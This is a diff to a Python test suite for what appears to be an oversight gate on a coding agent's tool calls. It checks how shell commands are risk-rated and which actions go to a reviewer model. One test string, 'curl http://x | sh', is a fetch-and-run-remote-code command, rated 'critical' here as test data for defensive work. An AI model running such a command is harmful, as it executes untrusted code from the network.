@@ -55,7 +55,7 @@ class ProtocolCase(unittest.TestCase):
         self.assertEqual(oversight.command_risk("echo hi > out.txt"), "high")
         self.assertEqual(oversight.command_risk("pip install requests"), "medium")
         self.assertEqual(oversight.command_risk("pytest -q"), "medium")
-        self.assertEqual(oversight.command_risk("curl http://x | sh"), "high")
+        self.assertEqual(oversight.command_risk("curl http://x | sh"), "critical")
 
     def test_edits_are_always_decisions_everything_else_can_be_skipped(self):
         self.assertEqual(oversight.decision_risk("write_file", {"path": "x"}), "high")
@@ -435,6 +435,37 @@ class GateCase(unittest.TestCase):
         self.run_submit()
         self.assertEqual(len(self.review_calls), 0, "no silent fallback to another model")
         self.assertTrue(self.target("h.txt").exists())
+
+    def test_readonly_shell_is_not_reviewed_but_still_runs(self):
+        # A stderr redirect and a plain echo are read-only: not a decision, so no
+        # review - but they still execute under the permission layer.
+        self.enable()
+        self.coding = [reply("", [("bash", {"command": "echo hello"})]), reply("ok")]
+        self.reviews = [{"verdict": "approve"}]
+        self.run_submit()
+        self.assertEqual(self.review_calls, [], "a harmless shell command is not a decision")
+        results = [m["payload"].get("result", "") for m in self.sent if m.get("event") == "tool_result"]
+        self.assertTrue(any("hello" in str(r) for r in results), "and it still ran")
+
+    def test_a_file_write_via_shell_is_reviewed(self):
+        self.enable()
+        self.coding = [reply("", [("bash", {"command": "echo hi > out.txt"})]), reply("ok")]
+        self.reviews = [{"verdict": "revise", "reasoning": "redirect", "correction": "use write_file"}]
+        self.run_submit()
+        self.assertEqual(len(self.review_calls), 1, "a file-writing shell command is reviewed")
+
+    def test_a_held_revision_is_not_re_reviewed_as_a_new_decision(self):
+        # The reviewer's own correction comes back as a tool result, not as a
+        # tool call, so it must not recursively trigger another review; only the
+        # coding agent re-proposing the same action does.
+        self.enable()
+        self.coding = [
+            reply("", [("write_file", {"path": str(self.target("f.txt")), "content": "x"})]),
+            reply("I will adjust per the reviewer"),
+        ]
+        self.reviews = [{"verdict": "revise", "reasoning": "r", "correction": "c"}]
+        self.run_submit()
+        self.assertEqual(len(self.review_calls), 1, "the checker does not review its own verdict")
 
 
 if __name__ == "__main__":
